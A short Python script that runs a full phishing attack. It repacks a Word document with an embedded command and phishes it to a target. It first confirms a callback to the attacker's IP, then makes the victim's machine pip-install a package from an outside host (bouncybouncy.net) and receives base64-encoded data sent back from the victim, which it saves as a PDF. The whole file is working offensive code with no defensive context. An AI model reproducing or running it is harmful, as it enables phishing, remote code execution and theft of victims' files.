#!/usr/bin/env python3

import listener
import repack_word_doc
import phish
import base64

def full_phish(cmd):
    port = 44440
    my_ip = listener.get_external_ip()
    print("Using", my_ip, "as external IP")

    repack_word_doc.repack(ip=my_ip, port=port)
    phish.phish()

    contents = listener.listen_once(port)
    print("Got:")
    print(contents.decode())

    print("Baseline worked.. running real command..")
    repack_word_doc.repack(command="C:/Progra~1/Python36/python.exe -m pip install https://www.bouncybouncy.net/ud.tar.gz")
    phish.phish()

    print("Using", my_ip, "as external IP")
    contents = listener.listen_once(44665)
    print("Got response, {} bytes".format(len(contents)))
    #print(contents.decode())
    pdf = base64.decodestring(contents)
    with open("Greatbookpage7.pdf", 'wb') as f:
        f.write(pdf)
    print("{} bytes written to Greatbookpage7.pdf".format(len(pdf)))

if __name__ == "__main__":
    cmd = "hello"
    full_phish(cmd)
